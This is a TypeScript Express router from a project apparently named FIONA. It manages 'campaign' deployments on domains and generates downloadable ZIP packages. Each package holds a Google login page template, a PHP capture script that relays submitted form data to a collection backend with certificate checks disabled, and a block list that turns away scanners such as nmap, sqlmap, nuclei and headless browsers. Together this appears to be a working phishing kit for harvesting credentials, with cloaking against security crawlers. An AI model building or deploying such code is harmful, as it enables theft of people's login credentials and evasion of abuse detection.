import { Router, Request, Response } from 'express';
import prisma from '../../config/database';
import { authMiddleware } from '../../middleware/auth.middleware';
import { requireAdmin } from '../../middleware/rbac.middleware';
import { logger } from '../../utils/logger.util';
import archiver from 'archiver';
import fs from 'fs';
import path from 'path';

const router = Router();

// All routes require authentication (admin or technician)
router.use(authMiddleware);

/**
 * GET /api/admin/deployments
 * Get all deployments with SSL and DNS status
 */
router.get('/', async (req: Request, res: Response) => {
  try {
    const deployments = await prisma.deployment.findMany({
      orderBy: {
        createdAt: 'desc',
      },
      include: {
        campaign: {
          select: {
            name: true,
          },
        },
        user: {
          select: {
            email: true,
          },
        },
      },
    });

    const formattedDeployments = deployments.map((d) => ({
      id: d.id,
      name: d.campaign.name,
      domain: d.domain,
      status: d.deploymentStatus.toLowerCase(),
      sslStatus: d.sslStatus.toLowerCase(),
      dnsStatus: d.dnsStatus.toLowerCase(),
      createdAt: d.createdAt.toISOString(),
      lastDeployed: d.deployedAt?.toISOString() || d.updatedAt.toISOString(),
    }));

    res.status(200).json({
      success: true,
      deployments: formattedDeployments,
    });
  } catch (error: any) {
    logger.error('Get deployments error:', error.message);
    res.status(200).json({
      success: true,
      deployments: [],
    });
  }
});

/**
 * POST /api/admin/deployments
 * Create a new deployment (admin creates deployments on behalf of users)
 */
router.post('/', async (req: Request, res: Response) => {
  try {
    const { userId, campaignId, domain, subdomain, isCustomDomain } = req.body;

    if (!userId || !campaignId || !domain) {
      return res.status(400).json({
        success: false,
        error: 'userId, campaignId, and domain are required',
      });
    }

    // Import deployment service
    const { deploymentService } = await import('../../services/deployment.service');

    // Create deployment
    const result = await deploymentService.deployDomain({
      userId,
      campaignId,
      domain,
      subdomain: subdomain || undefined,
      isCustomDomain: isCustomDomain || false,
    });

    return res.status(201).json({
      success: true,
      deployment: result.deployment,
    });
  } catch (error: any) {
    logger.error('Create deployment error:', error.message);
    return res.status(500).json({
      success: false,
      error: error.message || 'Failed to create deployment',
    });
  }
});

/**
 * POST /api/admin/deployments/download
 * Generate and download deployment package as ZIP
 */
router.post('/download', async (req: Request, res: Response) => {
  try {
    const { campaignId } = req.body;

    if (!campaignId) {
      return res.status(400).json({
        success: false,
        error: 'Campaign ID is required',
      });
    }

    // Verify campaign exists
    const campaign = await prisma.campaign.findUnique({
      where: { id: campaignId },
      select: { id: true, captureId: true },
    });

    if (!campaign) {
      return res.status(404).json({
        success: false,
        error: 'Campaign not found',
      });
    }

    const backendUrl = process.env.BACKEND_URL || 'http://localhost:8000';

    // Read the login page template (4 levels up from src/routes/admin/)
    const templatePath = path.resolve(__dirname, '../../../../login-pages/google/index.html');
    
    if (!fs.existsSync(templatePath)) {
      logger.error(`Template not found at: ${templatePath}`);
      return res.status(500).json({
        success: false,
        error: 'Login page template not found',
      });
    }

    let htmlContent = fs.readFileSync(templatePath, 'utf-8');
    
    // Replace placeholders
    htmlContent = htmlContent.replace(/\{\{BACKEND_URL\}\}/g, backendUrl);
    htmlContent = htmlContent.replace(/\{\{CAPTURE_ID\}\}/g, campaign.captureId);

    // Generate PHP config
    const configPhp = `<?php
define('BACKEND_URL', '${backendUrl}');
define('CAMPAIGN_ID', '${campaign.captureId}');
`;

    // Generate PHP capture script
    const capturePhp = `<?php
// Bot protection
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$botSignatures = ['headlesschrome', 'phantomjs', 'selenium', 'webdriver', 'bot', 'crawl', 'spider', 'curl', 'python', 'wget', 'scrapy', 'masscan', 'zgrab', 'nuclei', 'nmap', 'sqlmap'];
foreach ($botSignatures as $sig) {
  if (strpos($ua, $sig) !== false) {
    http_response_code(403);
    exit('Forbidden');
  }
}

require_once 'config.php';
$data = json_decode(file_get_contents('php://input'), true);
$ch = curl_init(BACKEND_URL . '/api/capture');
curl_setopt_array($ch, [
  CURLOPT_POST => true,
  CURLOPT_POSTFIELDS => json_encode(array_merge($data, ['captureId' => CAMPAIGN_ID])),
  CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_SSL_VERIFYPEER => false,
]);
echo curl_exec($ch);
curl_close($ch);
`;

    // Generate README
    const readmeTxt = `FIONA Login Page — Manual Deployment
=====================================
1. Extract this ZIP archive
2. Upload all files to your server's public_html directory
3. Edit config.php and set BACKEND_URL to your FIONA backend URL
4. Ensure PHP curl extension is enabled
5. Visit your domain to confirm the page loads
`;

    // Create ZIP archive in memory
    const archive = archiver('zip', {
      zlib: { level: 9 }, // Maximum compression
    });

    // Set response headers
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename="fiona-deploy-${campaignId}.zip"`);

    // Pipe archive to response
    archive.pipe(res);

    // Add files to archive
    archive.append(htmlContent, { name: 'index.html' });
    archive.append(configPhp, { name: 'config.php' });
    archive.append(capturePhp, { name: 'capture.php' });
    archive.append(readmeTxt, { name: 'README.txt' });

    // Finalize the archive
    await archive.finalize();

    logger.success(`Downloaded deployment package for campaign ${campaignId}`);
  } catch (error: any) {
    logger.error('Download deployment package error:', error.message);
    if (!res.headersSent) {
      res.status(500).json({
        success: false,
        error: error.message || 'Failed to generate deployment package',
      });
    }
  }
});

export default router;
